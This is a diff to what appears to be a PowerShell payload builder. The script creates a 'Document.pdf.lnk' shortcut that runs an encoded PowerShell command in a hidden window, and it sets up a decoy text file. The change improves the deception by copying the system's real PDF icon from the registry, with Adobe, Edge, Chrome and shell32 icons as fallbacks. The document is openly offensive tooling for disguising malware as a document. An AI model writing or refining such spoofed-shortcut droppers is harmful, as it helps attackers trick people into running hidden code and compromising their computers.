@@ -27,23 +27,40 @@ $lnk.Arguments = "-w h -Enc $encCmd"
 $lnk.WorkingDirectory = "%TEMP%"
 $lnk.WindowStyle = 7
 
-# Set PDF icon - try Adobe Reader first, fallback to shell32.dll
-$acroPaths = @(
-    "C:\Program Files\Adobe\Acrobat Reader DC\Reader\AcroRd32.exe",
-    "C:\Program Files\Adobe\Reader 11.0\Reader\AcroRd32.exe",
-    "C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroRd32.exe",
-    "C:\Program Files (x86)\Adobe\Reader 11.0\Reader\AcroRd32.exe"
-)
-$iconSet = $false
-foreach ($p in $acroPaths) {
-    if (Test-Path $p) { $lnk.IconLocation = "$p, 0"; $iconSet = $true; break }
+# Set PDF icon - query registry for the real PDF handler icon
+$pdfIcon = $null
+try {
+    $progId = (Get-ItemProperty "Registry::HKEY_CLASSES_ROOT\.pdf" -Name "(default)" -ErrorAction Stop)."(default)"
+    if ($progId) {
+        $iconLine = (Get-ItemProperty "Registry::HKEY_CLASSES_ROOT\$progId\DefaultIcon" -Name "(default)" -ErrorAction SilentlyContinue)."(default)"
+        if ($iconLine) { $pdfIcon = $iconLine }
+    }
+} catch {}
+
+# Fallback: check common PDF readers
+if (!$pdfIcon) {
+    $pdfPaths = @(
+        "C:\Program Files\Adobe\Acrobat Reader DC\Reader\AcroRd32.exe, 0",
+        "C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroRd32.exe, 0",
+        "C:\Program Files\Adobe\Reader 11.0\Reader\AcroRd32.exe, 0",
+        "C:\Program Files (x86)\Adobe\Reader 11.0\Reader\AcroRd32.exe, 0",
+        "$env:ProgramFiles\Microsoft\Edge\Application\msedge.exe, 4",
+        "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe, 4",
+        "$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe, 4",
+        "C:\Program Files\Google\Chrome\Application\chrome.exe, 4"
+    )
+    foreach ($entry in $pdfPaths) {
+        $exe = ($entry -split ",")[0]
+        if (Test-Path $exe) { $pdfIcon = $entry; break }
+    }
 }
-if (!$iconSet) {
-    # Fallback: shell32.dll document icon (index 70)
-    $lnk.IconLocation = "%SystemRoot%\system32\shell32.dll, 70"
-}
+
+# Ultimate fallback: shell32.dll document icon
+if (!$pdfIcon) { $pdfIcon = "%SystemRoot%\system32\shell32.dll, 70" }
+
+$lnk.IconLocation = $pdfIcon
 $lnk.Save()
-Write-Output "  [+] Document.pdf.lnk created"
+Write-Output "  [+] Document.pdf.lnk (icon: $pdfIcon)"
 
 # Create decoy Document.txt
 @"
